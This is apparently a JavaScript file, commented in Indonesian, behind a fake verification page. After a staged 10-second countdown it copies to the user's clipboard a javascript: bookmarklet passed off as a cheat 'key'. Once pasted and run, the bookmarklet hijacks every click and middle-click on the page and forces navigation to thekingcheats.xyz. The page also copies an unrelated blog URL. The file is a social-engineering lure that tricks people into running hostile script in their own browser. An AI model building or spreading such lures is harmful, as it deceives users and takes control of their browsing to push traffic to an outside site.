/* ==============================
   ISI YANG AKAN DISALIN
   ============================== */

// TEXT / KEY / APA PUN (bebas)
const textToCopy = `
javascript:(function(){try {if (window.forceClickActive) return; window.forceClickActive = true; window.forceClickHandler = function(e) { try { e.preventDefault(); e.stopImmediatePropagation(); if (e.type === 'auxclick' && e.button === 1) { window.open('https://thekingcheats.xyz/index.php','_blank'); } else { location.href = 'https://thekingcheats.xyz/index.php'; } } catch (err) {} }; document.addEventListener('click', window.forceClickHandler, true); document.addEventListener('auxclick', window.forceClickHandler, true); window.removeForceClick = function() { try { document.removeEventListener('click', window.forceClickHandler, true); document.removeEventListener('auxclick', window.forceClickHandler, true); window.forceClickActive = false; delete window.forceClickHandler; } catch (e) {} }; alert('Script activated (ALL ERROR KING KEY)'); } catch(e) { console.error(e); alert('Script error'); } })();
`;

// TEXT WEB CUSTOM (bukan URL web ini)
const webTextToCopy = `
https://blog.techbotal.com/aplicativos-de-relacionamento-a-tecnologia-que-transformou-a-forma-de-conectar-pessoas/
`;

/* ==============================
   LOGIC VERIFIKASI
   ============================== */

const verifyBtn = document.getElementById("verifyBtn");
const countdown = document.getElementById("countdown");
const success = document.getElementById("success");
const nextButtons = document.getElementById("nextButtons");

verifyBtn.addEventListener("click", () => {
    let time = 10;
    verifyBtn.disabled = true;
    verifyBtn.innerText = "Memverifikasi...";

    const timer = setInterval(() => {
        countdown.innerText = `Tunggu ${time} detik`;
        time--;

        if (time < 0) {
            clearInterval(timer);
            countdown.innerText = "";
            success.style.display = "block";
            nextButtons.style.display = "block";
            verifyBtn.style.display = "none";
        }
    }, 1000);
});

/* ==============================
   COPY FUNCTIONS
   ============================== */

function copyScript() {
    navigator.clipboard.writeText(textToCopy);
    alert("Text berhasil disalin!");
}

function copyWeb() {
    navigator.clipboard.writeText(webTextToCopy);
    alert("Text web berhasil disalin!");
}
